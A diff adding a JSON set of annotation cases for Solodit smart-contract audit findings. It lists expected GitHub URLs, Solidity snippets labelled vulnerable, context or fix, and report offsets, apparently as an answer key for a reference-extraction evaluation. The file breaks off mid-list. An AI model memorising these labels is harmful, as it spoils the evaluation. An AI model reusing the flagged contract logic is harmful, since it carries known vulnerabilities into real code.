@@ -1,0 +1,2171 @@
+[
+  {
+    "case_id": "solodit-66925",
+    "input_sha256": "7f3950ff3186ae11f0a2792c41c023a593702d744fd7706fae59e38623fd6992",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "quarantined",
+    "review_note": "Finding body contains subsequent I-01/I-02 and other findings; boundaries must be repaired before evidence attribution.",
+    "expected": [],
+    "forbidden": []
+  },
+  {
+    "case_id": "solodit-66924",
+    "input_sha256": "786d2a71dd5c2061ca133e4b988c82bbc798eb9785d0beb43e773ac80b5faeda",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/prompter-byte/up-contracts/blob/1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89/contracts/Voter.sol#L924-L952",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 924,
+        "end_line": 952,
+        "repo": "prompter-byte/up-contracts",
+        "ref": "1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89",
+        "path": "contracts/Voter.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2710,
+          "end_offset": 2831
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "expiredIndexFloor = index;\n",
+        "snippet_sha256": "f8f71ce45d6488c107e3160bbd5665c1319ed9eb775e5e58e17ccbc630ab6e42",
+        "role": "vulnerable",
+        "role_basis": "\n## Severity\n\nLow Risk\n\n## Description\n\nThe `_settleExpiredEpochs()` (`contracts/Voter.sol:924-952`) rolls `activeCapEpoch` forward on every epoch boundary and unconditionally sets:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 195,
+          "end_offset": 222
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "uint256 _supplyIndex = Math.max(supplyIndex[_gauge], expiredIndexFloor);\n",
+        "snippet_sha256": "32483b12102029d266b93f42b257fd8e48e4229cac81d469a238969e2a19fd53",
+        "role": "context",
+        "role_basis": "d on every epoch boundary and unconditionally sets:\n\n```solidity\nexpiredIndexFloor = index;\n```\n\nat `contracts/Voter.sol:943`, regardless of `capMode`.\n\nThe `_updateFor()` (`contracts/Voter.sol:662-694`) then computes the gauge's starting index as:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 392,
+          "end_offset": 465
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "function _settleExpiredEpochs() internal {\n    uint256 currentEpoch = ProtocolTimeLibrary.epochStart(block.timestamp);\n    if (activeCapEpoch == 0) {\n        activeCapEpoch = currentEpoch;\n        activeEpochStartIndex = index;\n        _applyQueuedCapModeFor(currentEpoch);\n        return;\n    }\n    if (activeCapEpoch >= currentEpoch) {\n        _applyQueuedCapModeFor(currentEpoch);\n        return;\n    }\n\n    uint256 expiredEpoch = activeCapEpoch;\n    uint256 burnAmount = epochReserve[expiredEpoch];\n    epochReserve[expiredEpoch] = 0;\n    epochBurned[expiredEpoch] += burnAmount;\n    epochSettled[expiredEpoch] = true;\n    if (burnAmount != 0) liveAccountedReserve -= burnAmount;\n    expiredIndexFloor = index;\n    activeCapEpoch = currentEpoch;\n    activeEpochStartIndex = index;\n    _applyQueuedCapModeFor(currentEpoch);\n\n    if (burnAmount != 0) {\n        IUp(rewardToken).burnFrom(address(this), burnAmount);\n    }\n    emit EpochCapSettled(expiredEpoch, expiredIndexFloor, burnAmount, liveAccountedReserve);\n}\n",
+        "snippet_sha256": "8c8003e6359d5000b10b5d4f110ebc3d2704c5eeae714126770320658fc54389",
+        "role": "vulnerable",
+        "role_basis": "r contract's balance, permanently unclaimable by anyone.\n\n## Location of Affected Code\n\nFile: [contracts/Voter.sol#L924-L952](https://github.com/prompter-byte/up-contracts/blob/1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89/contracts/Voter.sol#L924-L952)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2846,
+          "end_offset": 3864
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Up-Security-Review.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66923",
+    "input_sha256": "5f6de0a5d0af68daac46ca1aa85ac15c4eeadebf7b14d4cacff67483aca053ea",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/prompter-byte/up-contracts/blob/1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89/contracts/gauge-caps/GaugeCapController.sol#L340-L352",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 340,
+        "end_line": 352,
+        "repo": "prompter-byte/up-contracts",
+        "ref": "1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89",
+        "path": "contracts/gauge-caps/GaugeCapController.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 823,
+          "end_offset": 968
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "function _reportExpandsCapacity(\n    StoredReport storage stored,\n    GaugeEpochValueReport calldata _report\n) internal view returns (bool) {\n    if (_report.status != REPORT_STATUS_VALID) return false;\n    if (stored.status != REPORT_STATUS_VALID) return true;\n    uint256 oldDenominator = stored.feeValueWeth + stored.bribeValueWeth;\n    uint256 newDenominator = _report.feeValueWeth + _report.bribeValueWeth;\n    if (newDenominator > oldDenominator) return true;\n    if (stored.conservativeUpPriceWeth == 0) return true;\n    return _report.conservativeUpPriceWeth < stored.conservativeUpPriceWeth;\n}\n",
+        "snippet_sha256": "01972991c1c13801d50c1c221ec6715cb9e324604eb9e8611ff6e3c3c0988dad",
+        "role": "vulnerable",
+        "role_basis": "ncrease.\n\n## Location of Affected Code\n\nFile: [contracts/gauge-caps/GaugeCapController.sol#L340-L352](https://github.com/prompter-byte/up-contracts/blob/1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89/contracts/gauge-caps/GaugeCapController.sol#L340-L352)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 983,
+          "end_offset": 1586
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Up-Security-Review.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66922",
+    "input_sha256": "5686c1698b7371925a32b9e79be94636b27a6f1be7d27c0b734f0229e63733a5",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/prompter-byte/up-contracts/blob/1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89/contracts/Voter.sol#L722-L725",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 722,
+        "end_line": 725,
+        "repo": "prompter-byte/up-contracts",
+        "ref": "1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89",
+        "path": "contracts/Voter.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2552,
+          "end_offset": 2673
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "function _distribute(address _gauge) internal {\n    _settleExpiredEpochs();\n    _applyQueuedCapModeFor(ProtocolTimeLibrary.epochStart(block.timestamp));\n    _updateFor(_gauge);\n    // code\n}\n",
+        "snippet_sha256": "934fcb06870115db4fa3a9773ed0ccc25f1a0f339cbc57955289da74ec1ad6e0",
+        "role": "vulnerable",
+        "role_basis": "to the uncapped bucket the instant the new epoch begins.\n\n## Location of Affected Code\n\nFile: [contracts/Voter.sol#L722-L725](https://github.com/prompter-byte/up-contracts/blob/1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89/contracts/Voter.sol#L722-L725)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2688,
+          "end_offset": 2879
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Up-Security-Review.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66921",
+    "input_sha256": "f37f48a495383ecb80effd4911efc5e0686a852bf6939423bf088d6ac461689b",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/prompter-byte/up-contracts/blob/1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89/contracts/gauge-caps/GaugeCapController.sol#L224-L229",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 224,
+        "end_line": 229,
+        "repo": "prompter-byte/up-contracts",
+        "ref": "1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89",
+        "path": "contracts/gauge-caps/GaugeCapController.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1097,
+          "end_offset": 1242
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "function invalidateGaugeEpochReport(address _gauge, uint256 _releaseEpoch) external onlyAuthorizedInvalidator {\n    StoredReport storage stored = reports[_gauge][_releaseEpoch];\n    if (stored.reportVersion == 0) revert InvalidReport();\n    stored.status = REPORT_STATUS_INVALID;\n    emit GaugeValueReportInvalidated(_gauge, _releaseEpoch, msg.sender);\n}\n",
+        "snippet_sha256": "e8ed37ef34fe6e9b67fb3aa249e6bb90934baf373be04701122cd82901e90400",
+        "role": "vulnerable",
+        "role_basis": "ncapped.\n\n## Location of Affected Code\n\nFile: [contracts/gauge-caps/GaugeCapController.sol#L224-L229](https://github.com/prompter-byte/up-contracts/blob/1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89/contracts/gauge-caps/GaugeCapController.sol#L224-L229)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1257,
+          "end_offset": 1612
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Up-Security-Review.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66920",
+    "input_sha256": "45b09a091c29d564927195db837d833d0d2c6fd0e2d428e86e8d317b92999bcc",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/prompter-byte/up-contracts/blob/1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89/contracts/Voter.sol#L338-L343",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_file",
+        "start_line": 338,
+        "end_line": 343,
+        "repo": "prompter-byte/up-contracts",
+        "ref": "1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89",
+        "path": "contracts/Voter.sol",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2429,
+          "end_offset": 2550
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "function poke(uint256 _tokenId) external nonReentrant {\n    if (block.timestamp <= ProtocolTimeLibrary.epochVoteStart(block.timestamp)) revert DistributeWindow();\n    uint256 _weight = IVotingEscrow(ve).balanceOfNFT(_tokenId);\n    _poke(_tokenId, _weight);\n}\n",
+        "snippet_sha256": "0da1420ca9cf7b69b1034b907e29b6c8543afb00fe953e86868b4ba1b271582a",
+        "role": "vulnerable",
+        "role_basis": " automated to grief every decayed-lock veNFT each epoch.\n\n## Location of Affected Code\n\nFile: [contracts/Voter.sol#L338-L343](https://github.com/prompter-byte/up-contracts/blob/1e5ebbce0a8ae5904224beec6a9fadc7e0fafa89/contracts/Voter.sol#L338-L343)\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2565,
+          "end_offset": 2824
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Up-Security-Review.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66900",
+    "input_sha256": "1d15fdf1760a9c78b050bd8f5f5ef5b094cfa69de9c550c62bc4dfc65bfc200d",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Gas finding; snippet carries file name and noncontiguous source line numbers. Do not treat those numbers as one contiguous source range.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1505,
+          "end_offset": 1615
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "AccountableYield.sol\n504:        (uint256 performanceFeeShares, uint256 managementFeeShares, uint256 newTotalAssets) = _accruedFeeShares();\n565:        uint256 supply = IAccountableVault(vault_).totalSupply();      // inside _accruedFeeShares\n511:        uint256 totalSupply = IAccountableVault(vault).totalSupply();  // re-read on the same path, no mint between\n",
+        "snippet_sha256": "9e090dcfa6f4c2ab5fb46d1737652485542f0abdf80ba70f6753d05d01747b74",
+        "role": "context",
+        "role_basis": "), so the second cross-contract `STATICCALL` returns an identical value and repeats work already done. `_sharePrice` (`src/strategies/AccountableYield.sol:617-623`) has the same pattern: it calls `_accruedFeeShares` and then re-reads `totalSupply`.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 768,
+          "end_offset": 1131
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66899",
+    "input_sha256": "032e9cd6afe793a86574a633ea7ec4e830da0c01b9c25ac9f822800e1473f1de",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1145,
+          "end_offset": 1255
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "DepositGateway.sol\n153:        if (strategy_.lastNavMeasuredAt() <= epochs[epochId].openNavMeasuredAt) {\n157:        uint256 nav = _passEpoch(epochId, strategy_);\n249:            if (strategy_.lastNavMeasuredAt() <= epochs[epochId].openNavMeasuredAt) {\n263:        epoch.openNavMeasuredAt = strategy_.lastNavMeasuredAt();\n271:        navMeasuredAt = strategy_.lastNavMeasuredAt();\n",
+        "snippet_sha256": "6a9b7b38299a689e5f6fb164f3c16152904b0c018ec9ad0b1d8f803816daee12",
+        "role": "context",
+        "role_basis": "e 153, and `_openEpochIfNeeded` at lines 249/263 all read `lastNavMeasuredAt` immediately before invoking `_passEpoch`, with no intervening write. The re-read inside `_passEpoch` issues a redundant cross-contract STATICCALL on the epoch-close path.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 455,
+          "end_offset": 836
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66898",
+    "input_sha256": "509e9db1ed553fa337de829456a3aabeac81cc818d64b23fb705b8b758ab0aa8",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1568,
+          "end_offset": 1678
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "DepositGateway.sol\n139:        if (epochs[epochId].status != EpochStatus.Open) return; // unexpected - no-op, never revert\n141:        uint256 nav = _passEpoch(epochId, IMinimalStrategy(strategy));\n\n153:        if (strategy_.lastNavMeasuredAt() <= epochs[epochId].openNavMeasuredAt) {\n157:        uint256 nav = _passEpoch(epochId, strategy_);\n\n269:    function _passEpoch(uint256 epochId, IMinimalStrategy strategy_) private returns (uint256 navMeasuredAt) {\n270:        Epoch storage epoch = epochs[epochId];\n",
+        "snippet_sha256": "7819b0f406c0875248c7f64846ff47db97a51f68c4bc6bf08078f331a16bab58",
+        "role": "context",
+        "role_basis": "poch storage` pointer (or caching it) avoids one mapping-slot re-derivation plus the extra cold/warm SLOAD per close. This is a low-frequency path (NAV publish / recovery), so the savings are modest, but the dedup is guaranteed under optimizer-off.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 662,
+          "end_offset": 1172
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66897",
+    "input_sha256": "af97d405edaf55835285155fba2274069e19ceac386c55195ce4ea1ed8eb55d6",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/c54cb88b1c6fb3c757eea876a74534d4725903b7",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2028,
+          "end_offset": 2138
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "uint256 penaltyAmount =\n    _totalAssets(vault).mulDiv(lateInterestPenalty_ * penaltyTime, DAYS_1_SECONDS * BASIS_POINTS);\n...\naccruedPenalties += penaltyAmount;\n",
+        "snippet_sha256": "9e829b943a5c224b0353231fff955fe10c593a74f8c3d39c61812f7e5952b574",
+        "role": "vulnerable",
+        "role_basis": "**Description:** Each penalty increment is computed as a fraction of `_totalAssets`:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 98,
+          "end_offset": 260
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "return IAccountableVault(vault_).totalAssets() + deployedAssets + accruedPenalties;\n",
+        "snippet_sha256": "a6c0dcab3bf7498ccbbe30781b08592ed023344c4a2691d7bca875b34aae4b25",
+        "role": "context",
+        "role_basis": "n of `_totalAssets`:\n\n```solidity\nuint256 penaltyAmount =\n    _totalAssets(vault).mulDiv(lateInterestPenalty_ * penaltyTime, DAYS_1_SECONDS * BASIS_POINTS);\n...\naccruedPenalties += penaltyAmount;\n```\n\nand `_totalAssets` includes `accruedPenalties`:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 326,
+          "end_offset": 410
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_diff",
+        "block_index": 2,
+        "language_label": "diff",
+        "snippet": "+    // Simple interest on the principal base, excluding already-accrued penalties\n+    uint256 penaltyBase = IAccountableVault(vault).totalAssets() + deployedAssets;\n     uint256 penaltyAmount =\n-        _totalAssets(vault).mulDiv(lateInterestPenalty_ * penaltyTime, DAYS_1_SECONDS * BASIS_POINTS);\n+        penaltyBase.mulDiv(lateInterestPenalty_ * penaltyTime, DAYS_1_SECONDS * BASIS_POINTS);\n",
+        "snippet_sha256": "12c78dccd7bbe38f1a6a8d10921acdf996af24d99a09a36e46a899d54f7bc98e",
+        "role": "fix",
+        "role_basis": "d and absorb the collapse whnowen the borrower defaults and the phantom penalties are written off.\n\n**Recommended Mitigation:** Compute the penalty increment from a base that excludes prior penalties, so accrual is simple interest on the principal:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1583,
+          "end_offset": 1979
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66896",
+    "input_sha256": "e9d62542de79e1bcc241e961aeb251ad058d896ed7d501d7714aa590e4b240ca",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/0f7abda88e294c13dd1e30d1a57d9b219b4846a6",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 3706,
+          "end_offset": 3816
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "function onRequestRedeem(address share, uint256 shares, address, address)\n    public override(AccountableStrategy, IStrategyVaultHooks) nonReentrant onlyVault whenNotPaused\n    returns (bool canFulfill, uint256 price)\n{\n    if (shares < _loan.minRedeem) revert InsufficientShares();\n    _accruePenalties();\n    _accrueFees();\n    price = _sharePrice(share);\n    uint256 assets = shares.mulDiv(price, PRECISION);\n    uint256 liquidity = _getAvailableLiquidity();\n    canFulfill = liquidity >= assets && !_navIsStale();\n}\n",
+        "snippet_sha256": "aae694d7fc01bf3a978b5f33b9385a8a4babbad95d886ef60375654b3018dff4",
+        "role": "vulnerable",
+        "role_basis": "d therefore cannot front-run a NAV move. Redemptions have no equivalent guard. `onRequestRedeem` prices a redemption at the live `_sharePrice` and instant-fulfills it in the same transaction whenever liquidity is available and the NAV is not stale:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 468,
+          "end_offset": 988
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 1,
+        "language_label": "solidity",
+        "snippet": "function _navIsStale() internal view returns (bool) {\n    return block.timestamp > navGraceDeadline;\n}\n",
+        "snippet_sha256": "bfb741c6944b0eb7db64cb83b1b589feb469debffc3216648cc88390aa7a3844",
+        "role": "context",
+        "role_basis": " = liquidity >= assets && !_navIsStale();\n}\n```\n\n`_navIsStale()` is false for the entire `navGracePeriod` (default 24h) after the last publish, so a redemption is priced at the last published NAV right up until the next `publishRate` overwrites it:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1206,
+          "end_offset": 1309
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 2,
+        "language_label": "solidity",
+        "snippet": "function publishRate(uint256 newDeployedValue, uint256 measuredAt) external {\n    if (msg.sender != dvnPublisher) revert Unauthorized();\n    _requireLoanOngoing();\n    // ...\n    deployedAssets = newDeployedValue;\n    // ...\n}\n",
+        "snippet_sha256": "0d10e35cc527b91d1f69f07effe42e516146d0965b8ba29e9ffcc5793ec87521",
+        "role": "context",
+        "role_basis": ":\n\n```solidity\nfunction _navIsStale() internal view returns (bool) {\n    return block.timestamp > navGraceDeadline;\n}\n```\n\n`publishRate` is a single, mempool-visible transaction whose `newDeployedValue` fully determines the new (lower) share price:\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1453,
+          "end_offset": 1680
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66895",
+    "input_sha256": "3041055ce2bb747732e5309e04ae67a1ff4da4769ee03ed42d57ada1f7cbbaff",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "No fenced snippet; commit is a reported fix reference, not verified vulnerable code.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 1916,
+          "end_offset": 2026
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66894",
+    "input_sha256": "c3388cd3139a7e92afc48d9785befecea3454275b1553c86198fedc1e7b7b2b7",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 2211,
+          "end_offset": 2321
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66893",
+    "input_sha256": "4cf71c6a5552b12f856024186c1db9b7e292bfac30d844aba2cfea88fb226991",
+    "annotation_scope": "selected_targets",
+    "reviewer": "assistant-report-review",
+    "status": "report_reviewed",
+    "review_note": "Selected candidates and roles reviewed against report text; remote code not independently verified.",
+    "expected": [
+      {
+        "type": "url",
+        "url": "https://github.com/Accountable-Protocol/credit-vaults-internal/commit/aea937ccb0d39600236526c1dbcfe78fadbb3865",
+        "role": "unknown",
+        "resolution_expectation": "not_fetched",
+        "kind": "github_diff",
+        "role_basis": "Report links a change; before/after contents have not been validated.",
+        "report_location": {
+          "field": "content",
+          "start_offset": 973,
+          "end_offset": 1083
+        }
+      },
+      {
+        "type": "snippet",
+        "kind": "inline_snippet",
+        "block_index": 0,
+        "language_label": "solidity",
+        "snippet": "factory/DepositGatewayFactory.sol\n18:        gateway = address(new DepositGateway(strategy_));\n19:        if (gateway == address(0)) revert FailedDeployment(\"zero gateway address\");\n",
+        "snippet_sha256": "c2eb1fa03fcce3d4fa7e7bc71df7acd841b27ae9cea4759a05242356ba430284",
+        "role": "context",
+        "role_basis": "ator reverts the whole transaction if creation fails (out-of-gas, constructor revert, etc.) - it can never return `address(0)`. The branch is unreachable dead code; the `FailedDeployment` error and its string argument can never fire from this site.\n\n",
+        "report_location": {
+          "field": "content",
+          "start_offset": 468,
+          "end_offset": 650
+        }
+      }
+    ],
+    "forbidden": [
+      {
+        "type": "url",
+        "url": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2026-06-30-cyfrin-accountable-pr75-v2.0.md",
+        "reason": "Report/issue reference; not a code-file candidate. It may feed a report resolver."
+      }
+    ]
+  },
+  {
+    "case_id": "solodit-66892",
